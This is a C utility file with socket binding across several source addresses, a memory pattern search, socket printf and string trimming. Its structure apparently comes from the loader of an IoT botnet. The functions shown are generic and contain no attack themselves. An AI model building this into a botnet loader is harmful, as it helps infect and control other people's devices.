#include <stdint.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <fcntl.h>
#include <stdio.h>
#include <string.h>
#include <stdarg.h>

#include "headers/includes.h"
#include "headers/util.h"
#include "headers/server.h"

int util_socket_and_bind(struct server *srv)
{
    struct sockaddr_in bind_addr;
    int i = 0, fd = 0, start_addr = 0;
    BOOL bound = FALSE;

    if((fd = socket(AF_INET, SOCK_STREAM, 0)) == -1)
        return -1;

    bind_addr.sin_family = AF_INET;
    bind_addr.sin_port = 0;

    start_addr = rand() % srv->bind_addrs_len;
    for(i = 0; i < srv->bind_addrs_len; i++)
    {
        bind_addr.sin_addr.s_addr = srv->bind_addrs[start_addr];
        if(bind(fd, (struct sockaddr *)&bind_addr, sizeof(struct sockaddr_in)) == -1)
        {
            if(++start_addr == srv->bind_addrs_len)
                start_addr = 0;
        }
        else
        {
            bound = TRUE;
            break;
        }
    }
    if(!bound)
    {
        close(fd);
        #ifdef DEBUG
            printf("Failed to bind on any address\n");
        #endif
        return -1;
    }

    // Set the socket in nonblocking mode
    if(fcntl(fd, F_SETFL, fcntl(fd, F_GETFL, 0) | O_NONBLOCK) == -1)
    {
        #ifdef DEBUG
            printf("Failed to set socket in nonblocking mode. This will have SERIOUS performance implications\n");
        #endif
    }

    return fd;
}

int util_memsearch(char *buf, int buf_len, char *mem, int mem_len)
{
    int i = 0, matched = 0;

    if(mem_len > buf_len)
        return -1;

    for(i = 0; i < buf_len; i++)
    {
        if(buf[i] == mem[matched])
        {
            if(++matched == mem_len)
            {
                return i + 1;
            }
        }
        else
            matched = 0;
    }

    return -1;
}

BOOL util_sockprintf(int fd, const char *fmt, ...)
{
    char buffer[BUFFER_SIZE + 2];
    va_list args;
    int len = 0;

    va_start(args, fmt);
    len = vsnprintf(buffer, BUFFER_SIZE, fmt, args);
    va_end(args);

    if(len > 0)
    {
        if(len > BUFFER_SIZE)
            len = BUFFER_SIZE;

        #ifdef DEBUG
            printf("writing %s", buffer);
        #endif

        if(send(fd, buffer, len, MSG_NOSIGNAL) != len)
            return FALSE;
    }

    return TRUE;
}

char *util_trim(char *str)
{
    char *end;

    while(isspace(*str))
        str++;

    if(*str == 0)
        return str;

    end = str + strlen(str) - 1;
    while(end > str && isspace(*end))
        end--;

    *(end+1) = 0;

    return str;
}
